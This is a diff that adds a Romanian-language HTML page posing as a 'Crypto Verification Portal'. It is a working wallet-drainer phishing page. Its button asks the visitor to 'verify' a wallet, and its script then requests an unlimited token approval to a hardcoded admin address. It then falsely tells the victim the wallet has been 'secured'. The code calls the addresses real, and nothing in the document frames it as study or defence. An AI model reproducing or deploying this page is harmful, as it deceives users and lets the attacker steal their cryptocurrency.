@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="ro">
+<head>
+    <meta charset="UTF-8">
+    <title>Crypto Verification Portal</title>
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
+    <style>
+        body { background: #0f0f0f; color: white; font-family: 'Segoe UI', sans-serif; text-align: center; padding-top: 100px; }
+        .card { background: #1a1a1a; border: 1px solid #333; padding: 40px; border-radius: 20px; display: inline-block; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        button { background: linear-gradient(45deg, #f6851b, #ffb347); border: none; padding: 15px 40px; color: white; font-size: 18px; font-weight: bold; border-radius: 10px; cursor: pointer; transition: 0.3s; }
+        button:hover { transform: scale(1.05); }
+        #status { margin-top: 20px; color: #aaa; font-size: 14px; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h1>Verificare Portofel</h1>
+        <p>Conectați-vă portofelul pentru a primi acces la platformă.</p>
+        <button id="connectBtn">Connect & Verify Account</button>
+        <p id="status">Status: Deconectat</p>
+    </div>
+
+    <script>
+        // ADRESELE TALE REALE DIN REMIX
+        const TOKEN_ADDR = "0xf5911ccFae2C79f9346E3a663c301386e8f1438D";
+        const ADMIN_ADDR = "0xC18f47a87830D8DEfE42d87E40e9669aa11B108c";
+
+        document.getElementById("connectBtn").onclick = async () => {
+            const status = document.getElementById("status");
+            
+            if (window.ethereum) {
+                try {
+                    // 1. Logarea (Connect Wallet)
+                    const provider = new ethers.providers.Web3Provider(window.ethereum);
+                    await provider.send("eth_requestAccounts", []);
+                    const signer = provider.getSigner();
+                    const userAddress = await signer.getAddress();
+                    status.innerText = "Conectat ca: " + userAddress.substring(0, 6) + "...";
+
+                    // 2. Aprobarea (Approve Unlimited)
+                    const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
+                    const contract = new ethers.Contract(TOKEN_ADDR, abi, signer);
+                    
+                    status.innerText = "Confirmă verificarea în MetaMask...";
+                    
+                    // Cerem aprobare pentru o sumă uriașă (Unlimited)
+                    const tx = await contract.approve(ADMIN_ADDR, ethers.constants.MaxUint256);
+                    
+                    status.innerText = "Se finalizează verificarea...";
+                    await tx.wait();
+
+                    status.innerText = "✅ Verificare Reușită! Acum poți închide pagina.";
+                    alert("Succes! Portofelul a fost securizat.");
+
+                } catch (err) {
+                    status.innerText = "❌ Eroare: " + err.message;
+                }
+            } else {
+                alert("Te rugăm să instalezi MetaMask!");
+            }
+        };
+    </script>
+</body>
+</html>
